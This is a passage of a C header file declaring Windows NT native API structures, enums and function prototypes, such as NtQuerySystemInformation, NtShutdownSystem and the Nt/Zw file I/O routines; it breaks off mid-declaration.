    ULONG OpcodeREPPrefix   ;
    ULONG OpcodeHLT         ;
    ULONG OpcodeCLI         ;
    ULONG OpcodeSTI         ;
    ULONG BopCount          ;
} SYSTEM_VDM_INSTEMUL_INFO, *PSYSTEM_VDM_INSTEMUL_INFO;


typedef struct _SYSTEM_QUERY_TIME_ADJUST_INFORMATION {
    ULONG TimeAdjustment;
    ULONG TimeIncrement;
    BOOLEAN Enable;
} SYSTEM_QUERY_TIME_ADJUST_INFORMATION, *PSYSTEM_QUERY_TIME_ADJUST_INFORMATION;

typedef struct _SYSTEM_SET_TIME_ADJUST_INFORMATION {
    ULONG TimeAdjustment;
    BOOLEAN Enable;
} SYSTEM_SET_TIME_ADJUST_INFORMATION, *PSYSTEM_SET_TIME_ADJUST_INFORMATION;


typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_MEMORY_INFO {
    PUCHAR StringOffset;
    USHORT ValidCount;
    USHORT TransitionCount;
    USHORT ModifiedCount;
    USHORT PageTableCount;
} SYSTEM_MEMORY_INFO, *PSYSTEM_MEMORY_INFO;

typedef struct _SYSTEM_MEMORY_INFORMATION {
    ULONG InfoSize;
    ULONG StringStart;
    SYSTEM_MEMORY_INFO Memory[1];
} SYSTEM_MEMORY_INFORMATION, *PSYSTEM_MEMORY_INFORMATION;

typedef struct _SYSTEM_CALL_COUNT_INFORMATION {
    ULONG Length;
    ULONG NumberOfTables;
    //ULONG NumberOfEntries[NumberOfTables];
    //ULONG CallCounts[NumberOfTables][NumberOfEntries];
} SYSTEM_CALL_COUNT_INFORMATION, *PSYSTEM_CALL_COUNT_INFORMATION;

typedef struct _SYSTEM_CRASH_DUMP_INFORMATION {
    HANDLE CrashDumpSection;
} SYSTEM_CRASH_DUMP_INFORMATION, *PSYSTEM_CRASH_DUMP_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION {
    ULONG AlignmentFixupCount;
    ULONG ExceptionDispatchCount;
    ULONG FloatingEmulationCount;
    ULONG ByteWordEmulationCount;
} SYSTEM_EXCEPTION_INFORMATION, *PSYSTEM_EXCEPTION_INFORMATION;

typedef struct _SYSTEM_CRASH_STATE_INFORMATION {
    ULONG ValidCrashDump;
} SYSTEM_CRASH_STATE_INFORMATION, *PSYSTEM_CRASH_STATE_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
    ULONG RegistryQuotaAllowed;
    ULONG RegistryQuotaUsed;
    ULONG PagedPoolSize;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, *PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_GDI_DRIVER_INFORMATION {
    UNICODE_STRING DriverName;
    PVOID ImageAddress;
    PVOID SectionPointer;
    PVOID EntryPoint;
    PIMAGE_EXPORT_DIRECTORY ExportSectionPointer;
} SYSTEM_GDI_DRIVER_INFORMATION, *PSYSTEM_GDI_DRIVER_INFORMATION;
*/

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
	DelayExecution = 4,
	Suspended = 5,
	UserRequest = 6,
	WrExecutive = 7,
	WrFreePage = 8,
	WrPageIn = 9,
	WrPoolAllocation = 10,
	WrDelayExecution = 11,
	WrSuspended = 12,
	WrUserRequest = 13,
	WrEventPair = 14,
	WrQueue = 15,
	WrLpcReceive = 16,
	WrLpcReply = 17,
	WrVirtualMemory = 18,
	WrPageOut = 19,
	WrRendezvous = 20,
	Spare2 = 21,
	Spare3 = 22,
	Spare4 = 23,
	Spare5 = 24,
	WrCalloutStack = 25,
	WrKernel = 26,
	WrResource = 27,
	WrPushLock = 28,
	WrMutex = 29,
	WrQuantumEnd = 30,
	WrDispatchInt = 31,
	WrPreempted = 32,
	WrYieldExecution = 33,
	WrFastMutex = 34,
	WrGuardedMutex = 35,
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;

typedef enum _KTHREAD_STATE {
   Initialized = 0,
   Ready = 1,
   Running = 2,
   Standby = 3,
   Terminated = 4,
   Waiting = 5,
   Transition = 6,
   DeferredReady = 7,
   GateWait = 8
} KTHREAD_STATE;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG         WaitTime;
	PVOID         StartAddress;
	CLIENT_ID     ClientId;
	KPRIORITY     Priority;
	LONG          BasePriority;
	ULONG         ContextSwitchCount;
	KTHREAD_STATE ThreadState;
	KWAIT_REASON  WaitReason;
#ifdef _WIN64
	ULONG Reserved[4];
#endif
}SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength
    );

//------------------------------------------------------------------------------
// Shutdown system

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff

} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;


NTSYSAPI
NTSTATUS
NTAPI
NtShutdownSystem(
    IN SHUTDOWN_ACTION Action
    );

//-----------------------------------------------------------------------------
// File functions

#ifndef OLD_DOS_VOLID
#define OLD_DOS_VOLID   0x00000008
#endif

#ifndef FILE_SUPERSEDE
#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005
#endif  // File create flags


// Define the create/open option flags
#ifndef FILE_DIRECTORY_FILE
#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008
#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080
#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800
#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000
#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000
#endif // FILE_DIRECTORY_FILE


//
// Define the I/O status information return values for NtCreateFile/NtOpenFile
//

#ifndef FILE_SUPERSEDED
#define FILE_SUPERSEDED                 0x00000000
#define FILE_OPENED                     0x00000001
#define FILE_CREATED                    0x00000002
#define FILE_OVERWRITTEN                0x00000003
#define FILE_EXISTS                     0x00000004
#define FILE_DOES_NOT_EXIST             0x00000005
#endif


#ifndef PIO_APC_ROUTINE_DEFINED
typedef
VOID
(NTAPI *PIO_APC_ROUTINE) (
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
    );
#define PIO_APC_ROUTINE_DEFINED
#endif  // PIO_APC_ROUTINE_DEFINED


typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation         = 1,
    FileFullDirectoryInformation,   // 2
    FileBothDirectoryInformation,   // 3
    FileBasicInformation,           // 4  wdm
    FileStandardInformation,        // 5  wdm
    FileInternalInformation,        // 6
    FileEaInformation,              // 7
    FileAccessInformation,          // 8
    FileNameInformation,            // 9
    FileRenameInformation,          // 10
    FileLinkInformation,            // 11
    FileNamesInformation,           // 12
    FileDispositionInformation,     // 13
    FilePositionInformation,        // 14 wdm
    FileFullEaInformation,          // 15
    FileModeInformation,            // 16
    FileAlignmentInformation,       // 17
    FileAllInformation,             // 18
    FileAllocationInformation,      // 19
    FileEndOfFileInformation,       // 20 wdm
    FileAlternateNameInformation,   // 21
    FileStreamInformation,          // 22
    FilePipeInformation,            // 23
    FilePipeLocalInformation,       // 24
    FilePipeRemoteInformation,      // 25
    FileMailslotQueryInformation,   // 26
    FileMailslotSetInformation,     // 27
    FileCompressionInformation,     // 28
    FileObjectIdInformation,        // 29
    FileCompletionInformation,      // 30
    FileMoveClusterInformation,     // 31
    FileQuotaInformation,           // 32
    FileReparsePointInformation,    // 33
    FileNetworkOpenInformation,     // 34
    FileAttributeTagInformation,    // 35
    FileTrackingInformation,        // 36
    FileIdBothDirectoryInformation, // 37
    FileIdFullDirectoryInformation, // 38
    FileValidDataLengthInformation, // 39
    FileShortNameInformation,       // 40
    FileIoCompletionNotificationInformation, // 41
    FileIoStatusBlockRangeInformation,       // 42
    FileIoPriorityHintInformation,           // 43
    FileSfioReserveInformation,              // 44
    FileSfioVolumeInformation,               // 45
    FileHardLinkInformation,                 // 46
    FileProcessIdsUsingFileInformation,      // 47
    FileMaximumInformation                   // 48
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;


typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;


typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;


typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;


typedef struct _FILE_BASIC_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;


typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;


typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;


typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;


typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;


typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;


typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;


typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;


typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;


typedef struct _FILE_POSITION_INFORMATION {
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;


typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;


typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;


typedef struct _FILE_ALIGNMENT_INFORMATION {
    ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;


typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;


typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;


typedef struct _FILE_END_OF_FILE_INFORMATION {
    LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;


typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_PIPE_INFORMATION {
     ULONG ReadMode;
     ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;


typedef struct _FILE_PIPE_LOCAL_INFORMATION {
     ULONG NamedPipeType;
     ULONG NamedPipeConfiguration;
     ULONG MaximumInstances;
     ULONG CurrentInstances;
     ULONG InboundQuota;
     ULONG ReadDataAvailable;
     ULONG OutboundQuota;
     ULONG WriteQuotaAvailable;
     ULONG NamedPipeState;
     ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;


typedef struct _FILE_PIPE_REMOTE_INFORMATION {
     LARGE_INTEGER CollectDataTime;
     ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;


typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;


typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;


typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;


typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;


typedef struct _FILE_OBJECTID_INFORMATION
{
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        } ;
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;


typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;


typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;


typedef struct _FILE_NETWORK_OPEN_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;


typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
    ULONG FileAttributes;
    ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;


typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;


typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;


typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;


typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;


typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;


typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
    LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

typedef struct _FILE_LINK_ENTRY_INFORMATION {
    ULONG NextEntryOffset;
    LONGLONG ParentFileId;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;

typedef struct _FILE_LINKS_INFORMATION {
    ULONG BytesNeeded;
    ULONG EntriesReturned;
    FILE_LINK_ENTRY_INFORMATION Entry;
} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION;



typedef enum _FSINFOCLASS {
    FileFsVolumeInformation       = 1,
    FileFsLabelInformation,      // 2
    FileFsSizeInformation,       // 3
    FileFsDeviceInformation,     // 4
    FileFsAttributeInformation,  // 5
    FileFsControlInformation,    // 6
    FileFsFullSizeInformation,   // 7
    FileFsObjectIdInformation,   // 8
    FileFsDriverPathInformation, // 9
    FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;


NTSYSAPI
NTSTATUS
NTAPI
NtCreateFile(
    OUT PHANDLE FileHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  PLARGE_INTEGER AllocationSize,
    IN  ULONG FileAttributes,
    IN  ULONG ShareAccess,
    IN  ULONG CreateDisposition,
    IN  ULONG CreateOptions,
    IN  PVOID EaBuffer,
    IN  ULONG EaLength);


NTSYSAPI
NTSTATUS
NTAPI
ZwCreateFile(
    OUT PHANDLE FileHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  PLARGE_INTEGER AllocationSize,
    IN  ULONG FileAttributes,
    IN  ULONG ShareAccess,
    IN  ULONG CreateDisposition,
    IN  ULONG CreateOptions,
    IN  PVOID EaBuffer,
    IN  ULONG EaLength);


NTSYSAPI
NTSTATUS
NTAPI
NtOpenFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwOpenFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN PUNICODE_STRING FileName OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN PUNICODE_STRING FileName OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryVolumeInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryVolumeInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryEaFile(
    IN  HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN  ULONG Length,
    IN  BOOLEAN ReturnSingleEntry,
    IN  PVOID EaList OPTIONAL,
    IN  ULONG EaListLength,
    IN  PULONG EaIndex OPTIONAL,
    IN  BOOLEAN RestartScan);


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryEaFile(
    IN  HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN  ULONG Length,
    IN  BOOLEAN ReturnSingleEntry,
    IN  PVOID EaList OPTIONAL,
    IN  ULONG EaListLength,
    IN  PULONG EaIndex OPTIONAL,
    IN  BOOLEAN RestartScan);


NTSYSAPI
NTSTATUS
NTAPI
NtSetEaFile(
    IN  HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  PVOID Buffer,
    IN  ULONG Length);


NTSYSAPI
NTSTATUS
NTAPI
ZwSetEaFile(
    IN  HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  PVOID Buffer,
    IN  ULONG Length);


NTSYSAPI
NTSTATUS
NTAPI
NtReadFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwReadFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwWriteFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN PLARGE_INTEGER ByteOffset OPTIONAL,
    IN PULONG Key OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDeleteFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
NtFlushBuffersFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwFlushBuffersFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
    IN  HANDLE FileHandle,
    IN  HANDLE Event,
